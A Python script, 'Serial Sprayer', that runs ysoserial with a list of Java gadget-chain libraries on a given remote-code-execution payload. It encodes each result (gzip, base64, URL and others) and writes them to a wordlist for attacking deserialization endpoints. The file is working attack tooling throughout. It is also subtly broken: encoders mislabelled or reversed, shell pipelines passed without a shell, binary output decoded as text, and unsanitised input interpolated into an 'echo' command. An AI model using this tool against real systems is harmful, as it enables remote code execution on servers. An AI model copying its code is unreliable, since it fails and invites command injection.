#!/usr/bin/python3
""" Built-in modules """
import argparse
import logging
import sys
import urllib.parse
from pathlib import Path
from subprocess import check_output


# Sets the default output file name if optional param is not set #
DEFAULT_OUT_FILE = 'ss_wordlist.txt'


def url_exec(input_str: str) -> str:
    """
    Url encodes the passed in input string and returns.

    :param input_str:  The string to be URL encoded.
    :return:  The URL encoded string.
    """
    # Return the passed in string as url-encoded #
    return urllib.parse.quote_plus(input_str)


def ascii_hex_exec(input_str: str) -> str:
    """
    Hex encodes the passed in input string and returns.

    :param input_str:  The string to be hex encoded.
    :return:  The hex encoded string.
    """
    # Return the passed in string as hex #
    return input_str.encode(errors='replace').hex()


def base64_url_exec(input_str: str) -> str:
    """
    Base64 URL encodes the passed in input string and returns.

    :param input_str:  The string to be Base64 URL encoded.
    :return:  The Base64 URL encoded string.
    """
    # Encode input string as base64 #
    base64_out = check_output(f'echo {input_str} | base64', encoding='utf-8')
    # Return the Url encoded base64 output #
    return urllib.parse.quote_plus(base64_out)


def base64_exec(input_str: str) -> str:
    """
    Base64 encodes the passed in input string and returns.

    :param input_str:  The string to be Base64 encoded.
    :return:  The Base64 encoded string.
    """
    # Return the passed in string as base64 encoded #
    return check_output(f'echo {input_str} | base64', encoding='utf-8')


def zlib_exec(input_str: str):
    """
    Zlib compresses the passed in input string and returns.

    :param input_str:  The string to be zlib compressed.
    :return:  The compressed zlib data.
    """
    # Return the passed in string as compressed zlib data #
    return check_output(f'echo {input_str} | gzip', encoding='utf-8')


def gzip_exec(input_str: str):
    """
    Gunzip compresses the passed in input string and returns.

    :param input_str:
    :return:
    """
    # Return the passed in string as gzip compressed data #
    return check_output(f'echo {input_str} | gunzip', encoding='utf-8')


def out_chain_gen(java_data: str, config_obj: object) -> str:
    """
    The raw serialized java data to run through the specified compression/encoding routines.

    :param java_data:  The raw serialized java data.
    :param config_obj:  The program configuration instance.
    :return:  The final payload after being process through specified routines.
    """
    chain_out = ''

    # Iterate through compression/encoding list #
    for method in config_obj.out_chain:
        try:
            # Look up the current methods routine in hash table,
            # overwrite output variable per routine #
            chain_out = config_obj.routines[method](java_data)

        # If attempting to access key that does not exist #
        except KeyError:
            # Ignore & re-iterate #
            continue

    return chain_out


def main(config_obj: object):
    """
    Iterates through the yoserial libraries and generates payload per iteration and sends it
    through the compression/encoding chain handler before it is written to the output file.

    :param config_obj:  The program configuration instance.
    :return:  Nothing
    """
    try:
        # Open the output wordlist in append mode #
        with config_obj.out_file.open('a', encoding='utf-8') as out_file:
            # Iterate through the tuple of ysoserial library names #
            for library in config_obj.ysoserial_libs:
                print('break1')

                # Execute ysoserial with current iteration library and the specified payload #
                ysoserial_out = check_output([config_obj.java_path, '-jar',
                                              str(config_obj.ysoserial_path), library,
                                              f'{config_obj.payload}'], encoding='utf-8')

                print('break2')

                # Pass the serialized data to the output compression/encoding chain #
                serial_payload = out_chain_gen(ysoserial_out, config_obj)

                print('break3')

                # Write the final payload to the output file #
                out_file.write(serial_payload)

    # If error occurs during file operating #
    except OSError as file_err:
        # Print error, log, and exit #
        print_err(f'Error occurred during file operation: {file_err}')
        logging.error('Error occurred during file operation: %s', file_err)
        sys.exit(3)


def print_err(msg: str):
    """
    Prints error message through standard error.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    #  Print error via standard error #
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


class ProgramConfig:
    """
    Program configuration class for storing program components.
    """
    def __init__(self):
        self.cwd = Path.cwd()
        self.ysoserial_path = None
        self.payload = None
        self.out_chain = None
        self.ysoserial_libs = ('AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure',
                               'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
                               'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5',
                               'CommonsCollections6', 'CommonsCollections7', 'FileUpload1',
                               'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1',
                               'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
                               'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2',
                               'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1')
        self.out_file = None
        self.routines = {'gzip': gzip_exec, 'zlib': zlib_exec, 'base64': base64_exec,
                         'base64-url': base64_url_exec, 'ascii-hex': ascii_hex_exec,
                         'url': url_exec}
        # Confirm that Java exists on the system with the which command #
        has_java = check_output(['which', 'java'], encoding='utf-8')
        # If the system does not have java installed #
        if not has_java:
            # Print error and exit #
            print_err('The system does not have Java install, fix that and try again')
            sys.exit(2)

        self.java_path = has_java[:-1]

    def validate_file(self, string_path: str, is_required=False) -> Path:
        """
        Validates the input string path to file on disk. File string is set a pathlib instance, if
        it is required on disk it's existence is confirmed, it also confirms the path does not point
        to a directory, and whether the file path is relative or absolute and handles accordingly.

        :param string_path:  The string path to the file to be read/write.
        :param is_required:  Boolean toggle to specify whether file is required to exist on disk.
        :return:  The validated file path as pathlib instance.
        """
        # Format passed in string path as pathlib object #
        file_path = Path(string_path)
        # Ensure the file exists on disk #
        if is_required:
            # If the file is required and does not exist #
            if not file_path.exists():
                # Print error and exit #
                print_err(f'The file {file_path.name} does not exist on disk')
                sys.exit(2)

        # If the passed in file path is not absolute #
        if not file_path.is_absolute():
            # If the string path starts with a period specifying current directory #
            if string_path[:1] == '.':
                # Rewrite string without period using index slicing #
                string_path = string_path[2:]
                # Format the path based on the current directory #
                file_path = self.cwd / string_path
                # Make sure parent directory and its ancestors are created #
                file_path.parent.mkdir(parents=True, exist_ok=True)

            # If the string path starts with a tilde specifying the users home directory #
            elif string_path[:1] == '~':
                # Rewrite string without tilde using index slicing #
                string_path = string_path[2:]
                # Format the path based on the users home directory #
                file_path = Path.home() / string_path
                # Make sure parent directory and its ancestors are created #
                file_path.parent.mkdir(parents=True, exist_ok=True)

            # If the input is not of correct format #
            else:
                # Print error and exit #
                print_err(f'Error occurred parsing the file path: {file_path}')
                sys.exit(2)

        return file_path

    def validate_out_chain(self, parsed_chain: str):
        """
        Validates the pipe separate compression/encoding methods to be applied to the resulting
        serialized payload of ysoserial execution.

        :param parsed_chain:  The compression/encoding output chain.
        :return:  Nothing.
        """
        methods = ('gzip', 'zlib', 'base64', 'base64-url', 'ascii-hex', 'url')

        # Split the parsed output chain as a list by pipe limiters #
        parsed_methods = parsed_chain.split('|')
        # Iterate through the parsed method list and filter out items not in methods list #
        filtered_methods = [method for method in parsed_methods if method in methods]

        # If no methods remain #
        if not filtered_methods:
            # Print error and exit #
            print_err('Error parsing compression/encoding methods .. none detected '
                      'or faulty inputs have been filtered out')
            sys.exit(2)

        self.out_chain = filtered_methods


if __name__ == '__main__':
    RET = 0

    # Parse command line arguments #
    arg_parser = argparse.ArgumentParser(usage='%(prog)s [options] \'ysoserial_path\' \'payload\' '
                                               '\'out_chain\'',
                                         description='Serial Sprayer takes the input payload and '
                                                     'generates it with each ysoserial library. The'
                                                     ' output is then compressed/encoded specified '
                                                     'by the out_chain parameter and written to a '
                                                     'wordlist.')
    arg_parser.add_argument('ysoserial_path', help='The path to the ysoserial JAR file on disk')
    arg_parser.add_argument('payload', help='The RCE payload to serialized by ysoserial')
    arg_parser.add_argument('out_chain', help='The compression/encoding chain the output is piped '
                                              'to. Supported methods: gzip, zlib, base64, '
                                              'base64-url, ascii-hex, url. Ex: \'gzip|base64|url\'')
    arg_parser.add_argument('--out_file', help='The output wordlist where the payloads are stored')
    parsed_args = arg_parser.parse_args()

    # Initialize the program configuration instance #
    conf_obj = ProgramConfig()
    # Confirm the parsed ysoserial jar path #
    conf_obj.ysoserial_path = conf_obj.validate_file(parsed_args.ysoserial_path, is_required=True)
    # Assign payload in program config #
    conf_obj.payload = parsed_args.payload
    # Parse the various encodings as an encoding list
    conf_obj.validate_out_chain(parsed_args.out_chain)
    # If an output file path was specified #
    if parsed_args.out_file:
        # Confirm the output file path #
        conf_obj.out_file = conf_obj.validate_file(parsed_args.out_file)
    # Id an output file was not specified #
    else:
        # Set the default output file path #
        conf_obj.out_file = conf_obj.cwd / DEFAULT_OUT_FILE

    # Set up the log file and logging facilities #
    logging.basicConfig(filename='SerialSpray.log', level=logging.DEBUG,
                        format='%(asctime)s %(lineno)4d@%(filename)-16s[%(levelname)s]>>  '
                               ' %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    try:
        main(conf_obj)

    # If unexpected exception occurs during program operation #
    except Exception as err:
        # TODO: delete after dev
        import traceback
        traceback.print_exc()

        # Print, log error and set erroneous exit code #
        print_err(f'Unexpected exception occurred: {err}')
        logging.exception('Unexpected exception occurred: %s', err)
        RET = 1

    sys.exit(RET)
